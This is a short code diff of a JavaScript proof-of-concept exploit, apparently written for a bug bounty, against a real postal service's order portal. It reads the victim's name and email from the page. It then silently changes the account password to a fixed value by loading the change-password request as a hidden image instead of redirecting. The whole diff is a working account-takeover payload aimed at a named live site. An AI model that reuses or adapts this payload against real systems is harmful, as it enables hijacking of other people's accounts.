@@ -25,8 +25,9 @@ xhr.onreadystatechange = function () {
             const username =  doc.querySelector('input[id="username"]')?.value || null;
             const password= "BugBounty123!!";
             //alert("New password has changed for username:"+username+" to password:"+password);
-            
-window.location.href = `https://eordre.posten.no/OA_HTML/xxcu_ibeCAcdPersonalInfo_NBFV.jsp?submit.x=&ibempf=0:0:0&first_name=${o_first_name}&o_first_name=${o_first_name}&middle_name=${o_middle_name}&o_middle_name=${o_middle_name}&last_name=${o_last_name}&o_last_name=${o_last_name}&object_version_number=14&email_address=${emailAddress}&o_email_address=${emailAddress}&email_contact_point_id=${emailContactPointId}&email_object_vers44444ion_number=&password=${password}&vpassword=${password}`;
+ const img = document.createElement("img");
+img.src = `https://eordre.posten.no/OA_HTML/xxcu_ibeCAcdPersonalInfo_NBFV.jsp?submit.x=&ibempf=0:0:0&first_name=${o_first_name}&o_first_name=${o_first_name}&middle_name=${o_middle_name}&o_middle_name=${o_middle_name}&last_name=${o_last_name}&o_last_name=${o_last_name}&object_version_number=14&email_address=${emailAddress}&o_email_address=${emailAddress}&email_contact_point_id=${emailContactPointId}&email_object_vers44444ion_number=&password=${password}&vpassword=${password}`;
+document.body.appendChild(img);           
 alert("New password has changed for username:"+username+" to password:"+password);         
         } else {
 
